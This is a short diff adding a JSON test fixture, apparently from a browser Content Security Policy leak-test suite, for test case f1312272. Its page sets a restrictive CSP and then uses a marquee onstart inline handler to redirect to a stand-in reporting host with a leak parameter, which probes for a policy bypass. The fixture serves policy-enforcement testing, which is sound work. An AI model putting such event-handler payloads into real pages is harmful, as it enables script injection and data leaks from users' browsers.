@@ -1,0 +1,13 @@
+```json
+{
+  "f1312272": {
+    "url_queue.txt": "https://leak.test/CSP/f1312272/main\nhttps://a.test/report/?leak=baseline\n",
+    "leak.test": {
+      "main": {
+        "index.html": "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; script-src 'unsafe-eval'\">\n<marquee onstart=\"document.location.href='https://a.test/report/?leak=f1312272'\"></marquee>\n",
+        "headers.json": "[\n    {\n        \"key\": \"Content-Security-Policy\",\n        \"value\": \"default-src 'none'; script-src 'unsafe-eval'\"\n    }\n]"
+      }
+    }
+  }
+}
+```
